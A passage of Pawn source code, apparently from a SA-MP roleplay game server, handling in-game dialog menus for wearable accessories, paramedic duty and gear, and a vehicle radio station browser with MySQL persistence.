	        new Float:offset = floatstr(inputtext);
	        if(offset < -100) offset = 0;
			else if(offset > 360) offset = 360;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = offset;
		}
		ShowEditMenu(playerid);
	}
	if(dialogid == EDITTOYSRZ)
	{
	    if(response)
	    {
	        new Float:offset = floatstr(inputtext);
	        if(offset < -100) offset = 0;
			else if(offset > 360) offset = 360;
	        PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = offset;
		}
		ShowEditMenu(playerid);
	} */
	if(dialogid == EDITTOYSBONE)
	{
	    if(response)
	    {
			PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = listitem+1;
			if(PlayerToyInfo[playerid][slotselection[playerid]][ptBone] > 18 || PlayerToyInfo[playerid][slotselection[playerid]][ptBone] < 1) {
				PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 1;
			}
		}
	 	ShowEditMenu(playerid);
	}
	if((dialogid == WEARTOY) && response)
	{
	    if(PlayerToyInfo[playerid][listitem][ptModelID] == 0)
	    {
	        ShowPlayerDialogEx(playerid, 0, DIALOG_STYLE_MSGBOX, "Toy Menu: Attach/Deattach", "Whoops! You don't have anything to put on from that slot", "OK", "");
		}
		else
		{
		    if(IsPlayerAttachedObjectSlotUsed(playerid, listitem))
			{
			    new name[24];
			    format(name, sizeof(name), "None");

				for(new i;i<sizeof(HoldingObjectsAll);i++)
	   			{
					if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][listitem][ptModelID])
					{
						format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}
			    format(string, sizeof(string), "Successfully dettached %s (Bone: %s) (Slot: %d)", name, HoldingBones[PlayerToyInfo[playerid][listitem][ptBone]], listitem);
				SendClientMessage(playerid, COLOR_RED, string);
			    RemovePlayerAttachedObject(playerid, listitem);
			}
			else
			{
				if(listitem == 5 && PlayerInfo[playerid][pVip] < 1) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Bronze VIP to use that slot!");
			 	if(listitem == 6 && PlayerInfo[playerid][pVip] < 2) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Silver VIP to use that slot!");
        		if(listitem == 7 && PlayerInfo[playerid][pVip] < 3) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Gold VIP to use that slot!");

				if(PlayerToyInfo[playerid][listitem][ptScaleX] == 0) {
					PlayerToyInfo[playerid][listitem][ptScaleX] = 1.0;
					PlayerToyInfo[playerid][listitem][ptScaleY] = 1.0;
					PlayerToyInfo[playerid][listitem][ptScaleZ] = 1.0;
				}
			    SetPlayerAttachedObject(playerid, listitem, PlayerToyInfo[playerid][listitem][ptModelID], PlayerToyInfo[playerid][listitem][ptBone], PlayerToyInfo[playerid][listitem][ptPosX], PlayerToyInfo[playerid][listitem][ptPosY], PlayerToyInfo[playerid][listitem][ptPosZ],
				PlayerToyInfo[playerid][listitem][ptRotX], PlayerToyInfo[playerid][listitem][ptRotY], PlayerToyInfo[playerid][listitem][ptRotZ], PlayerToyInfo[playerid][listitem][ptScaleX], PlayerToyInfo[playerid][listitem][ptScaleY], PlayerToyInfo[playerid][listitem][ptScaleZ]);
			    new name[24];
			    format(name, sizeof(name), "None");

				for(new i;i<sizeof(HoldingObjectsAll);i++)
	   			{
					if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][listitem][ptModelID])
					{
						format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
					}
				}
				format(string, sizeof(string), "Successfully attached %s (Bone: %s) (Slot: %d)", name, HoldingBones[PlayerToyInfo[playerid][listitem][ptBone]], listitem);
				SendClientMessage(playerid, COLOR_RED, string);
			}
		}
	}

	if((dialogid == DELETETOY) && response) {
		if(IsPlayerAttachedObjectSlotUsed(playerid, listitem)) {
		    RemovePlayerAttachedObject(playerid, listitem);
		}

	    new
	        szQuery[128];

		SetPVarInt(playerid, "deleteObject", listitem);
     	mysql_format(sqldb,szQuery, sizeof(szQuery), "DELETE FROM toys WHERE Owner = %d AND ID = %d", PlayerInfo[playerid][pID], PlayerToyInfo[playerid][listitem][ptRealID]);
		mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_DELETE_PLAYER_OBJECT,playerid);
	}
	if((dialogid == BUYTOYSCOP) && response)
	{
	    new stringg[856];
		for(new x;x<MAX_PLAYERTOYS;x++)
		{
  			new name[24] = "None";

			for(new i;i<sizeof(HoldingObjectsAll);i++)
   			{
				if(HoldingObjectsAll[i][holdingmodelid] == PlayerToyInfo[playerid][x][ptModelID])
    			{
   					format(name, sizeof(name), "%s", HoldingObjectsAll[i][holdingmodelname]);
				}
			}

			format(stringg, sizeof(stringg), "%s(%d) %s (Bone: %s)\n", stringg, x, name, HoldingBones[PlayerToyInfo[playerid][x][ptBone]]);
		}
		ShowPlayerDialogEx(playerid, BUYTOYSCOP2, DIALOG_STYLE_LIST, "Select a Slot", stringg, "Select", "Cancel");
	}

	if((dialogid == BUYTOYSCOP2) && response)
	{
	    // (TEMPORARY - ZHAO NOTE) NO VIP added yet
	    /*if(listitem >= 3 && PlayerInfo[playerid][pVip] < 1 || listitem >= 3 && PlayerInfo[playerid][pBuddyInvited] == 1) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Bronze VIP to use that slot!");
	    if(listitem >= 4 && PlayerInfo[playerid][pVip] < 2) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Silver VIP to use that slot!");
        if(listitem >= 5 && PlayerInfo[playerid][pVip] < 3) return SendClientMessage(playerid, COLOR_WHITE, "* You must be a Gold VIP to use that slot!");
	    if(PlayerToyInfo[playerid][listitem][ptModelID] != 0) return SendClientMessage(playerid, COLOR_YELLOW, "* You already have something in that slot. Delete it with /toys");*/

		slotselection[playerid] = listitem;

		new stringg[1024];
		for(new x;x<sizeof(HoldingObjectsCop);x++)
		{
		    format(stringg, sizeof(stringg), "%s%s ($%d)\n", stringg, HoldingObjectsCop[x][holdingmodelname], HoldingObjectsCop[x][holdingprice]);
		}
		ShowPlayerDialogEx(playerid, BUYTOYSCOP3, DIALOG_STYLE_LIST, "Select an Item", stringg, "Buy", "Cancel");
	}
	if((dialogid == BUYTOYSCOP3) && response)
	{
		if(GetPlayerCash(playerid) < HoldingObjectsCop[listitem][holdingprice])
		{
		    SendClientMessage(playerid, COLOR_WHITE, "* You can't afford that!");
		}
		else
		{
			GivePlayerCash(playerid, -HoldingObjectsCop[listitem][holdingprice]);
		    PlayerToyInfo[playerid][slotselection[playerid]][ptModelID] = HoldingObjectsCop[listitem][holdingmodelid];

   			new modelid = PlayerToyInfo[playerid][slotselection[playerid]][ptModelID];
		    if((modelid >= 19006 && modelid <= 19035) || (modelid >= 19138 && modelid <= 19140))
		    {
		        PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.9;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.35;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
		    }
		    else if(modelid >= 18891 && modelid <= 18910)
		    {
		    	PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.15;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 90.0;
			}
			else if(modelid >= 18926 && modelid <= 18935)
			{
				PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.1;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			else if(modelid >= 18911 && modelid <= 18920)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.1;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.035;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 90.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 90.0;
			}
			else if(modelid == 19078 || modelid == 19078)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 16;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 180.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			else if((modelid >= 18641 && modelid <= 18644) || (modelid >= 19080 && modelid <= 19084) || modelid == 18890)
			{
			    PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 6;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
		    else
		    {
				PlayerToyInfo[playerid][slotselection[playerid]][ptBone] = 2;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = 0.0;
				PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = 0.0;
			}
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] = 1.0;
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY] = 1.0;
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ] = 1.0;

			new
			    szQuery[460];
			mysql_format(sqldb,szQuery, sizeof(szQuery),"INSERT INTO toys (Owner, ModelID, Bone, PosX, PosY, PosZ, RotX, RotY, RotZ, ScaX, ScaY, ScaZ) VALUES(%d, %d, %d, '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f', '%f')",
			PlayerInfo[playerid][pID], PlayerToyInfo[playerid][slotselection[playerid]][ptModelID], PlayerToyInfo[playerid][slotselection[playerid]][ptPosX], PlayerToyInfo[playerid][slotselection[playerid]][ptPosY], PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ],
			PlayerToyInfo[playerid][slotselection[playerid]][ptRotX], PlayerToyInfo[playerid][slotselection[playerid]][ptRotY], PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY],
			PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ]);
			mysql_tquery(sqldb,szQuery);
			// PlayerToyInfo[playerid][slotselection[playerid]][ptRealID] = mysql_insert_id();

			format(string, sizeof(string), "* You have purchased %s for $%d (Slot: %d)", HoldingObjectsCop[listitem][holdingmodelname], HoldingObjectsCop[listitem][holdingprice], slotselection[playerid]);
		    SendClientMessage(playerid, COLOR_RED, string);
		    SendClientMessage(playerid, COLOR_WHITE, "HINT: Use /toys to wear/edit this");
		}
	}
	if(dialogid == LSFMDMENU)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(PlayerInfo[playerid][pDuty] == 0)
				{
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, sizeof(string), "* Paramedic %s clocked in and is now on duty.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SetPlayerColor(playerid,TEAM_MED_COLOR);
					SetPlayerArmourEx(playerid, 100);
					SetPlayerHealth(playerid, 100.0);
					if(PlayerInfo[playerid][pRank] >= 4 || PlayerInfo[playerid][pLeader] == 3)
					{
        				GivePlayerValidWeapon(playerid, 42, 99999);
        			}
					Medics += 1;
					PlayerInfo[playerid][pDuty] = 1;
				}
				else
				{
					format(string, sizeof(string), "* Paramedic %s clocked out and is now off duty.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					Medics -= 1;
					PlayerInfo[playerid][pDuty] = 0;
					SetPlayerColor(playerid,TEAM_HIT_COLOR);
				}
			}
			if(listitem == 1)
			{
    			ShowPlayerDialogEx(playerid, LSFMDSKINS, DIALOG_STYLE_LIST, "What uniform do you want?","Firesuit 1\nFiresuit 2\nFiresuit 3\nMedic 1\nMedic 2\nMedic 3\nFemale\nHigh Rank", "Select", "Cancel");
			}
			if(listitem == 2)
			{
                ShowPlayerDialogEx(playerid, LSFMDGEAR, DIALOG_STYLE_LIST, "What gear do you want?","Spraycan\nShovel\nCamera\nParachute\nFire Extinguisher\nChainsaw\nShotgun\nVest\nFirst Aid Kit\nAccessories", "Select", "Cancel");
			}
			if(listitem == 3)
			{
				SetPlayerColor(playerid, TEAM_MED_COLOR);
				SetPlayerSkin(playerid, 170);
				ResetPlayerWeaponsEx(playerid);
			}
		}
 	}
    if(dialogid == LSFMDSKINS)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    PlayerInfo[playerid][pSkin] = 277;
				SetPlayerSkin(playerid, 277);
			}
			if(listitem == 1)
			{
			    PlayerInfo[playerid][pSkin] = 278;
    			SetPlayerSkin(playerid, 278);
			}
			if(listitem == 2)
			{
			    PlayerInfo[playerid][pSkin] = 279;
                SetPlayerSkin(playerid, 279);
			}
			if(listitem == 3)
			{
			    PlayerInfo[playerid][pSkin] = 274;
				SetPlayerSkin(playerid, 274);
			}
			if(listitem == 4)
			{
			    PlayerInfo[playerid][pSkin] = 275;
				SetPlayerSkin(playerid, 275);
			}
			if(listitem == 5)
			{
			    PlayerInfo[playerid][pSkin] = 276;
				SetPlayerSkin(playerid, 276);
			}
			if(listitem == 6)
			{
			    PlayerInfo[playerid][pSkin] = 217;
				SetPlayerSkin(playerid, 211);
			}
			if(listitem == 7)
			{
			    if(PlayerInfo[playerid][pRank] >= 5)
			    {
			        PlayerInfo[playerid][pSkin] = 295;
					SetPlayerSkin(playerid, 295);
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GRAD2, "Only ranks 5 and 6 can wear this uniform.");
				}
			}
		}
 	}
  	if(dialogid == LSFMDGEAR)
	{
		if(response)
		{
		    if(PlayerInfo[playerid][pConnectTime] < 2)
				return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");

			switch(listitem) {
			    case 0: GivePlayerValidWeapon(playerid, 41, 99999);
			    case 1: GivePlayerValidWeapon(playerid, 6, 99999);
			    case 2: GivePlayerValidWeapon(playerid, 43, 99999);
			    case 3: GivePlayerValidWeapon(playerid, 46, 99999);
			    case 4: GivePlayerValidWeapon(playerid, 42, 99999);
			    case 5: {
	                if(PlayerInfo[playerid][pRank] >= 4 || PlayerInfo[playerid][pLeader] == 4) {
	        			GivePlayerValidWeapon(playerid, 9, 99999);
	        		} else SendClientMessage(playerid, COLOR_GRAD2, "You're not a high enough rank!");
				}
				case 6: GivePlayerValidWeapon(playerid, 25, 99999);
				case 7: SetPlayerArmourEx(playerid, 100);
				case 8: SetPlayerHealth(playerid, 100);
				case 9: ShowPlayerDialogEx(playerid, BUYTOYSCOP, DIALOG_STYLE_MSGBOX, "Accessories", "Welcome to the law enforcement accessory locker!","Continue", "Cancel");
			}

			/*if(listitem == 0)
			{
				GivePlayerValidWeapon(playerid, 6, 99999);
			}
			else if(listitem == 1)
			{
				GivePlayerValidWeapon(playerid, 43, 99999);
			}
			else if(listitem == 2)
			{
				GivePlayerValidWeapon(playerid, 46, 99999);
			}
			else if(listitem == 3)
			{
				GivePlayerValidWeapon(playerid, 42, 99999);
			}
			else if(listitem == 4)
			{
                if(PlayerInfo[playerid][pRank] >= 4 || PlayerInfo[playerid][pLeader] == 4)
                {
        			GivePlayerValidWeapon(playerid, 9, 99999);
        		}
        		else
        		{
            		SendClientMessage(playerid, COLOR_GRAD2, "You're not a high enough rank!");
        		}
			}
			else if(listitem == 5)
			{
        		GivePlayerValidWeapon(playerid, 25, 99999);
			}
			else if(listitem == 6)
			{
        		SetPlayerArmourEx(playerid, 100);
			}
			else if(listitem == 7) SetPlayerHealth(playerid, 100);*/
			//else if(listitem == 8) ShowPlayerDialogEx(playerid, BUYTOYSCOP, DIALOG_STYLE_MSGBOX, "Accessories", "Welcome to the law enforcement accessory locker!","Continue", "Cancel");
		}
 	}
	if(dialogid == DIALOG_RADIOMENU_START)
	{
		if(response)
		{
			if(listitem == 0)
			{
  				new radiovehicle = GetPlayerVehicleID(playerid);

  				if(VehicleRadioStation[radiovehicle] == 0)
  				{
  				    SendClientMessage(playerid, COLOR_GRAD1, "The radio in this vehicle is already turned off.");
					return 1;
  				}

				format(string, sizeof(string), "* %s has turned off the radio.", GetPlayerNameEx(playerid));
				ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			    VehicleRadioStation[radiovehicle] = 0;
       			StopAudioStreamForPlayer(playerid);

          		foreach(Player, i)
				{
				    if(GetPlayerVehicleID(i) == radiovehicle && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == PLAYER_STATE_PASSENGER && i != playerid)
				    {
				        StopAudioStreamForPlayer(i);
				    }
				}
			}
			if(listitem == 1)
			{
				ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_SEARCH, DIALOG_STYLE_INPUT, "Radio stations - Search radio", "Enter the radio station you want to search for.\n\nNote: The search must be no less than 3 characters in length.", "Search", "Cancel");
			}
			if(listitem == 2)
			{
				ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_GENRE, DIALOG_STYLE_LIST, "Radio stations - Select a genre", "Alternative\nBlues\nClassical\nCountry\nDecades\nEasy Listening\nElectronic\nFolk\nInspirational\nInternational\nJazz\nLatin\nMetal\nMisc\nNew Age\nPop\nPublic Radio\nR&B/Urban\nRap\nReggae\nRock\nTalk", "Select", "Cancel");
			}
		}
	}
	if(dialogid == DIALOG_RADIOMENU_SEARCH)
	{
		if(response)
		{
 			if(strlen(inputtext) < 3)
	    	{
	        	ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_SEARCH, DIALOG_STYLE_INPUT, "Radio stations - Search radio", "ENTRY DECLINED: The search must be no less than 3 characters in length.\n\nEnter the radio station you want to search for.\n\nNote: It must be no less than 3 characters.", "Search", "Cancel");
	    	}
	    	else
	    	{
	    	    for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

    			new stringg[512], name[32], search[128], iCount;

    			strcat(search, inputtext, sizeof(search));

				for (new i=0; i<220; i++)
				{
					if(strfind(VehicleRadioListing[i][radioname], search, true) != -1 && iCount < 50)
					{
            			format(name, sizeof(name), "%s", VehicleRadioListing[i][radioname]);
						format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
						ListItemTrackId[playerid][iCount++] = i;
					}
				}
				if(iCount == 0)
				{
				    ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_SEARCH, DIALOG_STYLE_INPUT, "Radio stations - Search radio", "SEARCH FAILED: No such radio stations found.\n\nEnter the radio station you want to search for.\n\nNote: It must be no less than 3 characters.", "Search", "Cancel");
				}
				else
				{
					ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_SEARCHLIST, DIALOG_STYLE_LIST, "Ratio stations - Search results", stringg, "Play", "Cancel");
				}
			}
	    }
 	}
	if(dialogid == DIALOG_RADIOMENU_SEARCHLIST)
	{
		if(response)
		{
			new t = ListItemTrackId[playerid][listitem];
			new radiovehicle = GetPlayerVehicleID(playerid);

			if(VehicleRadioStation[radiovehicle] == t+1)
			{
   				SendClientMessage(playerid, COLOR_GRAD1, "The radio station in this vehicle is already set to that station.");
				return 1;
			}

			format(string, sizeof(string), "* %s has set the radio station to %s.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			VehicleRadioStation[radiovehicle] = t+1;
  			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[t][radiourl]);

			foreach(Player, i)
			{
  				if(GetPlayerVehicleID(i) == radiovehicle && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == PLAYER_STATE_PASSENGER && i != playerid)
	    		{
      				PlayAudioStreamForPlayer(i, VehicleRadioListing[t][radiourl]);
		    	}
			}
		}
	}
	if(dialogid == DIALOG_RADIOMENU_GENRE)
	{
		if(response)
		{
			new stringg[321], name[32], iCount;

			for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

			if(listitem == 0)
			{
			    for(new r = 0; r < 10; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Alternative", stringg, "Play", "Cancel");
			}
			if(listitem == 1)
			{
   				for(new r = 10; r < 20; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Blues", stringg, "Play", "Cancel");
			}
			if(listitem == 2)
			{
   				for(new r = 20; r < 30; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Classical", stringg, "Play", "Cancel");
			}
			if(listitem == 3)
			{
   				for(new r = 30; r < 40; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Country", stringg, "Play", "Cancel");
			}
			if(listitem == 4)
			{
   				for(new r = 40; r < 50; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Decades", stringg, "Play", "Cancel");
			}
			if(listitem == 5)
			{
   				for(new r = 50; r < 60; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Easy Listening", stringg, "Play", "Cancel");
			}
			if(listitem == 6)
			{
   				for(new r = 60; r < 70; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Electronic", stringg, "Play", "Cancel");
			}
			if(listitem == 7)
			{
   				for(new r = 70; r < 80; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Folk", stringg, "Play", "Cancel");
			}
			if(listitem == 8)
			{
   				for(new r = 80; r < 90; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Inspirational", stringg, "Play", "Cancel");
			}
			if(listitem == 9)
			{
   				for(new r = 90; r < 100; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - International", stringg, "Play", "Cancel");
			}
			if(listitem == 10)
			{
   				for(new r = 100; r < 110; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Jazz", stringg, "Play", "Cancel");
			}
			if(listitem == 11)
			{
				for(new r = 110; r < 120; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Latin", stringg, "Play", "Cancel");
			}
			if(listitem == 12)
			{
				for(new r = 120; r < 130; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Metal", stringg, "Play", "Cancel");
			}
			if(listitem == 13)
			{
				for(new r = 130; r < 140; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Misc", stringg, "Play", "Cancel");
			}
			if(listitem == 14)
			{
				for(new r = 140; r < 150; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - New Age", stringg, "Play", "Cancel");
			}
			if(listitem == 15)
			{
				for(new r = 150; r < 160; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Pop", stringg, "Play", "Cancel");
			}
			if(listitem == 16)
			{
				for(new r = 160; r < 170; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Public Radio", stringg, "Play", "Cancel");
			}
			if(listitem == 17)
			{
				for(new r = 170; r < 180; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - R&B/Urban", stringg, "Play", "Cancel");
			}
			if(listitem == 18)
			{
				for(new r = 180; r < 190; ++r)
			    {
